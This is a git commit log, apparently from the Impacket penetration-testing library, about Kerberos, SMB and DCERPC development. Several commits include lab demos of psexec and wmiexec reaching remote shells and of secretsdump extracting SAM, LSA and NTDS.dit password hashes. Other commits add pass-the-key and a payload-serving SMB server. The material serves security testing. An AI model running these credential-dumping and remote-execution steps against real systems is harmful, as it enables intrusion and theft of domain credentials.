Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Mar 9 16:29:43 2015 +0000

    1) Fixing definitions for opnums 21/22 and 23
    2) IEnumWbemClassObject_Next lTimeout should be ULONG instead of LONG
    3) ExecNotificationQuery() result is casted to a IEnumWbemClassObject()

commit 1f2e2bc501643b4484de00ab825177882a76e1a4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Mar 8 14:35:28 2015 +0000

    Always comparing SPNs in uppercase

commit 5cbfd48e039a1f9ff87d75bcb2e9e4a4be2b0dfa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 7 22:40:43 2015 +0000

    Casting the return values for the methods called

commit f538b88a34ad56a3d24e665d369d26012fde1dc2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Mar 7 22:18:40 2015 +0000

    Better error control

commit 7d6cf3f174497e1da584edf36f53f4acaff85965
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Mar 5 15:42:51 2015 +0000

    Fixes an STATUS_INVALID_PARAMETER response against some Samba Servers

commit 49926d6e389b00625387b61a9772d938985e7fef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Mar 4 19:12:10 2015 +0000

    Changing some default values for these strucs.. mimicking what Windows is returning back

commit d4c9d1a6314d4f971d4141fd037199728c16c4e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Mar 3 21:17:14 2015 +0000

    Adding a few structures and constants for the smbserver

commit d6d3f89f7c3a822e0e9c4f788a6d07eb8475759d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Feb 24 15:16:54 2015 +0000

    Using PyCrypto's gcd implementation

commit 8596051e4bc2a23e3706362404b2381dd0f58846
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 18 19:59:33 2015 +0000

    Fixes https://code.google.com/p/impacket/issues/detail?id=53 reported by crlawrence. I applied the patch provided. Thanks!

commit 0ba062b88c607f1c6d82e19de9a715363348bd86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 17:51:40 2015 +0000

    Unregistering commands we don't really need

commit 67b4e2d2ca3611b13d7dc5e0ad2efcd78a9c7b0f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 17:51:14 2015 +0000

    Adding unregisterSmbCommand(), unregisterNTTransaction(), unregisterTransaction2() and unregisterTransaction().
    Useful if you want to provide a constrainted SMB Server.
    Note that if the command asked by the client is not registered, the SMB Server will automatically return STATUS_NOT_IMPLEMENTED.

commit f96cae5f6f47ee4b5f71a1e73925d5b5a7992b26
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 16:19:28 2015 +0000

    Let's try to avoid allowing write requests from the client back to us
    not 100% bulletproof, plus also the client might be using other SMB
    calls (e.g. SMB_COM_WRITE)

commit f12a89c3656a7a490df201c4284d73e9ef03ca5f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 14:26:56 2015 +0000

    One important ToDo:
    
       [ ] Disable write request, now if the client tries to copy
           a file back to us, it will overwrite the files we're
           hosting. *CAREFUL!!!*

commit aed578854fff86653e4129c49d341d4a04c19784
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Feb 13 13:45:29 2015 +0000

    Adding NETLOGON, SYSVOL shares (fakes), in case they are asked

commit 004371f5d04345bbb999c256a92973350b9d005f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 12 12:24:19 2015 +0000

    The idea of this script is to answer any file read request
    with a set of predefined contents based on the extension
    asked, regardless of the sharename and/or path.
    When executing this script w/o a config file the pathname
    file contents will be sent for every request.
    If a config file is specified, format should be this way:
       <extension> = <pathname>
    for example:
       bat = /tmp/batchfile
       com = /tmp/comfile
       exe = /tmp/exefile
    
    ToDo:
    [ ] A lot of testing needed under different OSes
    [X] It's not working for first level directories
        (e.g. \\IP\share\file) - DONE
    [ ] Add support for other SMB read commands. Right now just
        covering SMB_COM_NT_CREATE_ANDX
    
    I'm not sure how reliable this approach is, so I might ditch this in the future.. hopefully no!

commit ccc3f55f2aee09dade22513201e64c8c33a2879e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Feb 11 21:42:06 2015 +0000

    Fixed bug in transaction hook functions

commit 67bdc297120c5f3c96ec5c0710aa90352cf75a74
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 21:10:55 2015 +0000

    Fixed wrong calling of SBMConnection.readFile()

commit 2f3e335f13e8a7bcfd929d1fd09691cc050e9e1e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 21:02:53 2015 +0000

    Adding kerberos test cases

commit 33e17a79e73f93b9a8c396d06b772ae4442eec33
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 20:59:12 2015 +0000

    From now on, when doing ncacn_np communications, we're not using transactions anymore, now calling directly to writeFile

commit 06b8b563e15553b2380a8462ecf7a09f690f6373
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 18:08:22 2015 +0000

    Adding Kerberos test_cases

commit feec49e6d4235256d6924e2ca390efdefb67e918
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 14:20:54 2015 +0000

    Better error checking for suplementalCredentials. It was failing on some old XP systems

commit 7634f3e526f5b0c1028914a227ef8395cf11606d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 9 13:47:50 2015 +0000

    If we receive KDC_ERR_ETYPE_NOSUPP, we give it another try using RC4 (if not
    used before) and hope for the best.
    Seems to be a decent way to make kerberos work against some old Windows XP
    boxes. Still having some problems at the DCERPC level tho.

commit aa048d45f15b5fc57a58f718f4776d56ccba7a09
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 22:07:23 2015 +0000

    If we receive KDC_ERR_ETYPE_NOSUPP, we give it another try using RC4 (if not used before) and hope for the best.
    Seems to be a decent way to make kerberos work against some old Windows XP boxes. Still having some problems at the DCERPC level tho.

commit be4980960c0b158b5e82f50fdc6ba9e2e30c90b5
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 00:17:37 2015 +0000

    When calculating the stringBinding.. convert what we receive to uppercase.

commit c39c79c889d861e2c670f0d1ae13587d1a380932
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Feb 8 00:17:13 2015 +0000

    Trying to decode a KerberosError if it happens.. still not perfect.. we should interpret the krb5_blob here

commit 38a915a0541ff0c8edb2f28eb8bfc7f044378859
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 23:51:38 2015 +0000

    Forgot one raise ;)

commit 9a9b40225276a0f19abf7a021f9218ff786b8aa8
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 23:48:28 2015 +0000

    Attack might have worked, but when asking for the cifs TGS we get KDC_ERR_ETYPE_NOSUPP. If that happens, we try all over again using RC4

commit 2d119b71cee41eff851d374e1e1ea2b534559fbd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Feb 7 22:40:50 2015 +0000

    Fixed typo

commit cc3e726c764519a52a8386226348cf9703e05d63
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Feb 5 20:23:26 2015 +0000

    Replacing Crypto.Random.get_random_bytes for our own implementation

commit 1765c3984a0821ebccb3c31f6893680dac192c34
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:49:33 2015 +0000

    Kerberos support added

commit 1f6095f0133992a68f695066fbba80fd4ca926a5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:32:21 2015 +0000

    Removing traceback

commit 72fd4ec15aaac83932a960a282cae989b1f9cb5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 14:31:39 2015 +0000

    GSSAPI_AES128 support

commit 0c4d21c073a665513e1abbff6264946023d1ba1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Feb 2 13:52:43 2015 +0000

    Credentials are now passed by command line, aligned with other scripts. You can still logoff/logon inside the mini shell tho.

commit 2d04544c44d5e0c7cd9fda43a237849757ccc8e9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 21:21:36 2015 +0000

    service install ported to the new dcerpc.v5

commit 32e10b80271185597a3ea4579787495b140c73ee
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 19:56:17 2015 +0000

    Add domain FDQN whenever possible

commit f2ff812d3b347d0ea4144fb5122fb99652d3d069
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:52:36 2015 +0000

     Adding support for pass the key

commit b3c614ab6b38ae6446fb898fd44a967ceedf4336
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:28:37 2015 +0000

    Adding support for pass the key

commit 27f0b5b43d7b970f84e2f7ddfac6e125e6fca834
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 17:19:12 2015 +0000

    This changeset adds support for Kerberos pass the key, originally implemented by Benjamin Delpy (@gentilkiwi) in mimikatz.

commit 2fd3bf2289f30d0cdf1c81cb930484b1f43d7240
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 00:18:21 2015 +0000

    Adding parsing of [MS-SAMR] 2.2.10 Supplemental Credentials Structures. I'm just grabbing the kerberos keys, just the "new" ones. I could grab the WDigest data... but still don't know how to use them effectively.
    How to use these kerberos keys?.. coming soon.

commit 20ea3c498546289378ab51f45cf54e2c395491d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 30 00:06:38 2015 +0000

    Adding [MS-SAMR] 2.2.10 Supplemental Credentials Structures structure

commit 38c59dd9977c456daa1ac3054af601c31cadd1f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 29 19:34:23 2015 +0000

    Adding capability to export to John The Ripper format files

commit 32ec8ab90fff2717ebeef33bdb25b1ada49b8315
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 27 15:10:29 2015 +0000

    Adding support for SMB Encryption. It will be used if the target server requires it either at session or share level using AES_CCM. Current stable pycrypto does NOT support this mode. For this feature to work you will need to download/compile and install the experimental version. Currently it is https://ftp.dlitz.net/pub/dlitz/crypto/pycrypto/pycrypto-2.7a1.tar.gz

commit e7ff108eced16286ceeb1c8c57845e08289e4819
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 23 12:54:36 2015 +0000

    Updated description

commit 51215ea8017dacc1d0617dc05243fe3271a56437
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:35:25 2015 +0000

    Ported to dcerpc.v5

commit bdaaf07616d6f954897a5056ca31444df3906a9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:06:21 2015 +0000

    DCE [C706] MGMT Interface Implementation

commit 98b5269290487362e6cf02fdffcbe746672e90bf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 21:02:38 2015 +0000

    Ability to avoid checking errors in the DCE RPC answer (needed for mgmt interface)

commit 5fd8e8753dceaefe94cd54c5e54cc86fb8f9b395
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 21 20:34:15 2015 +0000

    Changing pad calculation for arrays when TS is NDR64

commit 90c38e248f7e111704375e71109fe2c7c21955cf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 23:35:57 2015 +0000

    Added deprecation warning message to all non dcerpc.v5 classes

commit 29d18e8cfde391cd5d5194bce5d236a585642425
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 22:53:16 2015 +0000

    Updated copyright

commit 6957420118347d698496e75ff47196d3c0fdc248
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 19:59:06 2015 +0000

    Removing -port parameter. Not needed

commit 3c2e430b6dd3e09305a892cf6718fda3a50dcecd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 17:12:26 2015 +0000

    1) kerberosv5.py: Fixing typo in error message
    2) smb.py: When building the principal name, the remote_name should be used instead of remote_host
    3) smb3.py: getaddrinfo should be done on the self._Connection['ServerIP'] variable

commit 15228f4563f24be92872faf99de5fc3f3204a4aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 20 15:07:34 2015 +0000

    Adding get and put commands to the semi-interactive shell. You can include drive letters as destination pathnames as well. It'll use the drive letter as the share (plus '$') to connect to.

commit dd1500e65f457b15f9baa9545c073d153bde5e4a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:30:14 2015 +0000

    upgrading to dcerpc.v5

commit d7a4be2ef84a00c16e4be5b145184c304294112f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:26:53 2015 +0000

    Removing unnecesary imports

commit 14515391aa5b3ca8c24a5929373c72fd094e5636
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 18:25:56 2015 +0000

    Getting rid of the old dcerpc library.. now using dcerpc.v5

commit bbce63a34a6b14e434cb35d7e881f975ea10242a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 14 16:32:03 2015 +0000

    Clarifying target could be an IP address or targetName

commit b4cacea6afc6dc5c7e03aa4d55cf6520e21837b1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 13 21:01:41 2015 +0000

    Sending ServerName = '\x00' instead of NULL. Older Samba implementation fails to accept NULL as paramenter.

commit 747f8848beb43572a47826d53fbfabb117ac77c4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:22:33 2015 +0000

    1) Better error reporting when we cannot resolve a hostname and when domain is not specified
    2) Improved the way we calculate offsets inside authData for WRAP structure parsing

commit 6439379c7c24e72a67187a5b02035eff09bbc008
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:17:27 2015 +0000

    Added debug output flags. Nothing much is outputed now but migth be useful in the future

commit a5d7e7dad7b71aff82690e17588c3421b1ebf142
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Jan 12 14:16:10 2015 +0000

    Since targets can be IP addresses or hostnames, I'm changing some internal variables/methods names to be consistent.

commit 107b3bc6a162e5494fb3242be06161fc6c92a68c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:55:22 2015 +0000

    Copyright update

commit 661145e669185f5baa255def308ac56b1896b81b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:52:47 2015 +0000

    Updated documentation about AES256-CTS-HMAC-SHA1-96.

commit 1334f7bd4b5b170c1300166c38f74bfd75224428
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 21:44:50 2015 +0000

    Enabling AES128-CTS-HMAC-SHA1-96 support for all Kerberos operations (including goldenPac.py). RC4 would be used only when hashes are specified or KDC_ERR_ETYPE_NOSUPP is returned when trying AES.

commit 17e23eaa527baa7a503a238505d032b3fafee9f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 20:50:32 2015 +0000

    GSS_Wrap and GSS_Unwrap for AES256.. finally.. closer we are..

commit 27bbf85a2d42f97adb3d0837a392fa8a4045cb0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:11:07 2015 +0000

    Kerberos support added (incl. ccache)

commit ad1959a0258ad158a5234949aea57660757d2752
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:07:49 2015 +0000

    Kerberos support (incl. ccache)

commit 700bbb6d9f9d5b2198976367686c0645142b542b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Jan 9 00:03:02 2015 +0000

    Kerberos support (incl. ccache) for psexec.
    
    jack:examples beto$ klist
    Credentials cache: FILE:/Users/beto/ccache
            Principal: normaluser7@FREEFLY.NET
    
      Issued                Expires               Principal
    Jan  8 20:11:32 2015  Jan  9 06:11:32 2015  krbtgt/FREEFLY.NET@FREEFLY.NET
    jack:examples beto$ python psexec.py -k -no-pass freefly.net/normaluser7@freefly-dc cmd.exe
    Impacket v0.9.13-dev - Copyright 2002-2015 Core Security Technologies
    
    Trying protocol 445/SMB...
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [*] Requesting shares on freefly-dc.....
    [*] Found writable share ADMIN$
    [*] Uploading file oaZRkqjh.exe
    [*] Opening SVCManager on freefly-dc.....
    [*] Creating service gpvj on freefly-dc.....
    [*] Starting service gpvj.....
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    [!] Press help for extra shell commands
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Microsoft Windows [Version 6.1.7601]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
    
    C:\Windows\system32>whoami
    nt authority\system
    
    C:\Windows\system32>

commit 8953ece80adc91c3bc0bb5bee6c3c7e8c6afa129
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 23:26:02 2015 +0000

    We're forcing connectTree to use the target's IP address instead of its name. Might bring some issues.. not completely sure yet

commit fa6950ede474af5a4862d0b1c84d65d3bcae7bc9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:28:44 2015 +0000

    Adding -no-pass switch, uniform with the other scripts we're adding kerberos support to

commit ed89b315b74aa8a564ec6d27b0d5b5a0f922dce6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:24:29 2015 +0000

    removed import that was not used

commit 5b8e9981d929bc0ce2c59deaf95af497cb0ada8c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:22:41 2015 +0000

    Duplicate import

commit ebeacd25ca1a409c805b3b07281be60b9ac023a6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 21:18:27 2015 +0000

    Adding kerberos get/setter to the base transport class so we can do kerberos through the transport factory

commit 1d8f3a9a83a02092b75719d252ac29ca578dcdca
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 20:22:59 2015 +0000

    Better handling of NTLMAuthChallengeResponse.getData()/fromString(). Still not perfect since it's not possible to know whether the MIC field will be there or not w/o inspecting the Challenge message's AV PAIRS.

commit 5c6005027673c34101df58d18bfb44018453cde5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 16:17:55 2015 +0000

    Adding  getActiveConnections()

commit a170f7a02c1d65a506e0563655282e2841af5563
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 13:28:46 2015 +0000

    Added -dc-ip option, in case you want to target an specific domain controller or cannot resolve

commit 015c4efd28d960d9dbd2d0c6f5392368c3dac1af
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Jan 8 00:57:32 2015 +0000

    1) Sequence number needs to be reseted when altering contexts
    2) Removing CCache status messages for RPC since it generates a lot of noise

commit 634aac146194c8076b2466c38e3811e56277e253
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:56:32 2015 +0000

    Happy new year :)

commit 5372825c7f4855f0d19ce7d7b25dccb388a66b04
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:56:08 2015 +0000

    Kerberos support for secretsdump.py. Matches the same usage of wmiexec.py (e.g. -no-pass switch)
    
    Examples:
    
    jack:impacket beto$ klist -v
    Credentials cache: FILE:/Users/beto/ccache
            Principal: Administrator@FREEFLY-2012R2.NET
        Cache version: 4
      KDC time offset: -1 second
    
    Server: krbtgt/FREEFLY-2012R2.NET@FREEFLY-2012R2.NET
    Client: Administrator@FREEFLY-2012R2.NET
    Ticket etype: arcfour-hmac-md5, kvno 2
    Ticket length: 1155
    Auth time:  Jan  7 18:43:10 2015
    End time:   Jan  8 04:43:08 2015
    Ticket flags: enc-pa-rep, pre-authent, initial, proxiable, forwardable
    Addresses: addressless
    
    jack:examples beto$ python secretsdump.py -k -no-pass FREEFLY-2012R2.NET/Administrator@FFLY-2012R2-DC
    Impacket v0.9.13-dev - Copyright 2002-2015 Core Security Technologies
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [*] Service RemoteRegistry is in stopped state
    [*] Starting service RemoteRegistry
    [*] Target system bootKey: 0x22d7b24d8eb4032e9ba9baaf0f4f6b93
    [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:ebd8ac3ca25e615c406c2c15b44a6ca6:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    [*] Dumping cached domain logon information (uid:encryptedHash:longDomain:domain)
    [*] Dumping LSA Secrets
    [*] $MACHINE.ACC
    FREEFLY-2012R2\FFLY-2012R2-DC$:aad3b435b51404eeaad3b435b51404ee:0f88dee50c20e5a7c479df5c0ed94297:::
    [*] DefaultPassword
    (Unknown User):ROOT#123
    [*] DPAPI_SYSTEM
     0000   01 00 00 00 FC 8A 2B 5A  CE F6 FF 89 5D 0A C9 08   ......+Z....]...
     0010   62 60 22 29 D3 C0 19 41  B1 4D F7 B5 D7 68 72 75   b`")...A.M...hru
     0020   DE 37 EA 67 1B 20 FA D5  A8 1A F8 C1               .7.g. ......
    [*] NL$KM
     0000   9E B3 1A 1B C7 7F 28 87  9D D3 23 EB 9A 13 D6 FC   ......(...#.....
     0010   B8 E7 41 DE 8A F6 2B 4E  57 91 36 0D AD B5 39 8A   ..A...+NW.6...9.
     0020   86 4D D8 30 ED 0E 97 68  0B 0A 87 E5 D1 03 E5 8F   .M.0...h........
     0030   A2 ED 0C 75 C5 F3 DB 69  2C CD BB 1E 4C 82 C1 29   ...u...i,...L..)
    [*] Searching for NTDS.dit
    [*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
    [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
    [*] Searching for pekList, be patient
    [*] Pek found and decrypted: 0xe2f4cbb594d082e5ddc8bf0fb9892746
    [*] Reading and decrypting hashes from \\FFLY-2012R2-DC\ADMIN$\Temp\oBqCwVyB.tmp
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:eba8ac3cb25e605c606b2c15b43a6ca6:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    FFLY-2012R2-DC$:1001:aad3b435b51404eeaad3b435b51404ee:0f88def50c20e5a8c479df6c0ed94297:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:98fceba6f84d49a9837e6cf992c926ec:::
    FREEFLY-2012R2.NET\user1:1104:aad3b435b51404eeaad3b435b51404ee:2f5de3f35895d71d9cf16e52511cb692:::
    [*] Cleaning up...
    [*] Stopping service RemoteRegistry
    [*] Cleaning up...
    [*] Stopping service RemoteRegistry

commit b58f9379e50e0a3a7bdf80f73d09075b3371ed5f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:45:09 2015 +0000

    Kerberos support for wmiexec. It can use cached tickets or specified credentials.
    
    jack:examples beto$ kinit Administrator@FREEFLY-2012R2.NET
    Administrator@FREEFLY-2012R2.NET's Password:
    jack:examples beto$ klist -v
    Credentials cache: FILE:/Users/beto/ccache
            Principal: Administrator@FREEFLY-2012R2.NET
        Cache version: 4
      KDC time offset: -1 second
    
    Server: krbtgt/FREEFLY-2012R2.NET@FREEFLY-2012R2.NET
    Client: Administrator@FREEFLY-2012R2.NET
    Ticket etype: arcfour-hmac-md5, kvno 2
    Ticket length: 1155
    Auth time:  Jan  7 18:43:10 2015
    End time:   Jan  8 04:43:08 2015
    Ticket flags: enc-pa-rep, pre-authent, initial, proxiable, forwardable
    Addresses: addressless
    
    jack:examples beto$ python wmiexec.py -no-pass -k FREEFLY-2012R2.NET/Administrator@FFLY-2012R2-DC
    Impacket v0.9.13-dev - Copyright 2002-2014 Core Security Technologies
    
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    SMBv3.0 dialect used
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    Using Kerberos Cache: /Users/beto/ccache
    Using TGT from cache
    [!] Launching semi-interactive shell - Careful what you execute
    C:\>whoami
    freefly-2012r2\administrator
    
    C:\>

commit 83f871605ddd4f716ad4c1cdaf3293caabce4d00
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 21:42:36 2015 +0000

    Kerberos support for DCOM.

commit d9f6c98941c90dc3035c669c52df2cfa9d9c8e92
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Jan 7 16:49:49 2015 +0000

    1) Replacing NTLM_AUTH_* for RPC_C_AUTHN_*
    2) String binding calculation now has in mind the target_ip can actually be a netbios name

commit 81598e19bc30274cd0e05102175bbc83ba343e60
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Jan 6 19:26:15 2015 +0000

    More GSSAPI stuff. Right now, RPC SIGN/SEAL should be working for RC4. AES still not there

commit 6ce21783a4bb3ed018d56e7c5158aee3fe460551
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 4 21:52:54 2015 +0000

    typo in constant name (not value)

commit 41a2a0f64297c2cd4a6d75546cb5e1fb1f2591e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Jan 4 19:48:28 2015 +0000

